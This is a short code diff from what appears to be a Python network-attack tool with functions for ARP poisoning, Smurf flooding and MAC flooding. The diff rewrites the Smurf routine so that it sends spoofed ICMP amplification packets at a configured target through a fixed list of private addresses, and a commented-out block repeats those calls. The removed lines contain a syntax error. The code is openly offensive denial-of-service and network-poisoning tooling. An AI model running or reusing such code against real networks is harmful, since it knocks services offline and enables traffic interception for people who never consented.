@@ -184,12 +184,27 @@ def RunARPPoisoning():
     print("complete.")
     return "RunARPPoisoning"
 def RunSmurf():
-	for i in range(40, 254):
-		for j in range(0, 254):
-			packet = Smurf(config.targetIPDestination,
-			  "192.168."+str(i)+"."+str(j)])
-			send(packet) 
-			print(packet)
+    pkts = {"192.168.40.1",
+               "192.168.44.4",
+               "192.168.50.7",
+               "192.168.48.9"}
+    for p in pkts:
+        packet = Smurf(config.targetIPDestination, p)
+        send(packet)
+        print(packet)
+
+"""
+    packet = Smurf(config.targetIPDestination, "192.168.40.1")
+    send(packet) 
+    packet = Smurf(config.targetIPDestination, "192.168.44.3")
+    send(packet) 
+    packet = Smurf(config.targetIPDestination, "192.168.44.4")
+    send(packet) 
+    packet = Smurf(config.targetIPDestination, "192.168.50.7")
+    send(packet) 
+    packet = Smurf(config.targetIPDestination, "192.168.48.9")
+    send(packet) 
+"""
 def RunMACFlood():
     packet = MACFlood()
     print(packet)
